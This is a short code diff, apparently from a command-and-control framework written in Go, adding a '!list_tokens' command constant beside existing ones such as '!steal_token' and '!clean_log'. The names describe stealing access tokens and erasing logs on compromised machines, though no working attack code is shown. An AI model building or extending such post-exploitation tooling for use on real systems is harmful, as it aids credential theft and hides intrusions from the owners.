@@ -11,6 +11,7 @@ const (
 	C2CmdListDir      = "!ls_dir" // API for path auto-completion
 	C2CmdCleanLog     = "!clean_log"
 	C2CmdStealToken   = "!steal_token"
+	C2CmdListTokens   = "!list_tokens"
 	C2CmdCustomModule = "!custom_module"
 
 	C2CmdStat           = "!stat"
